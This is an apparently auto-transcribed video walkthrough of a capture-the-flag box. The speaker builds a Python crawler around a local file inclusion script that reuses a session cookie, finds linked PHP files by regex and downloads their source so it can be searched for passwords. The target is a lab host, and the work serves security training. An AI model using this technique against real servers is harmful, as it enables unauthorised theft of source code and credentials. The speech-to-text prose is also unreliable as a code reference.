lfi input star so this will import the lfi script and then we do if name is equal to main and all this does is say this piece of code will only be executed executed if we're accessing it directly if we include it as a library it doesn't get executed because name is not going to be main so we'll do crawl http backup.forwardslash.htb and we're going to create that function crawl so we'll do def crawl on page and then we forgot a semicolon or a colon not semicolon but source is equal to get source page and we'll just print source out now to make sure this works so python 3 crawl and it does not work let's see uh oh source and let's see crawl this should just be like index.php i think still false let's see oh it's probably the cookie we're probably not logged in anymore because it's been like a day uh enter yeah we're not logged in so ipsec please subscribe and we'll copy the cookie oh please subscribe there we go so copy the cookie v lfi uh it doesn't look like it generates new sessions if i just oh god no there we go there we go now we're calling so we want to look through this source code to get php files so let's go back into crawl dot pi and let's import the regex module so r e and we can say files is equal to r e dot find all regular expression um whatever is in these parentheses will be matched so we want a to z and then uh hold on there we go a to z match any number of a to z dot php so we can try that first if i can type and we're searching source and we can print files so let's see how this works uh not well i did not terminate and that worked better than i thought honestly so um we may want to add like zero through nine as well just in case it had numbers in it so the issue we're gonna have here is if any page included like directories because we're not gonna grab like uh dev index.php this way but i don't think that ever exists in a link so we should be fine um we can add a to do for you so to do allow regex to parse urls right now it only grabs file names so that should be simple enough so here we do for i n files and then we can say crawl i and we also want to print i so we know what we're going to crawl run this and we see it kind of going through a loop between welcome and login so we have to have some type of logic so it knows what it's crawled before so we're going to do crawled is equal to a list and then say um if i not in crawled then we'll do crawl dot append i to add this to uh we've already crawled it list and we can say oops and that there's two and instead of printing i i want to print crawled and eventually we get some type of error string of bytes like object so what's before this um thing let's print source we want to print both the page and the source i'm guessing we're getting false somewhere here so it didn't like one of the pages uh password.php it did not like and this one is actually probably passwordreset.php so we should add a dash in here so backslash dash i think or hyphen and it looks like it completes that time so let's now do this and it downloaded a bunch of things and we can see there was a dash in that so what we want to do here is put a try and accept or maybe um let's see [Music] if not source print fail to download page okay i want to delete this hyphen now to make sure this logic works and we can break out of the function after that breaks outside of a loop um return there we go so now the script doesn't die and we handle that error of saying failed to download so that's good okay so now we can get rid of this logic of printing crawled and we can say how do we do it before with save file save underscore file page name and then source i believe so we can say crawl append save file i is going to be the page name and the source is called source so do it ls here we don't have any php scripts so python3 lfi.pi actually uh let's do the lfi.py real quick and for save file i want to do get current working directory downloads door so it's going to make a directory download so we don't pollute our current directory python3 crawl.pi we probably should have put some type of logic to say downloading file but we didn't we do have a downloads directory and a bunch of php files so that would then we could like grab it for a password and find a bunch of hits but yeah that is creating a custom web crawler with this lfi hope you guys enjoy that little extra tidbit take care and i will see you all next week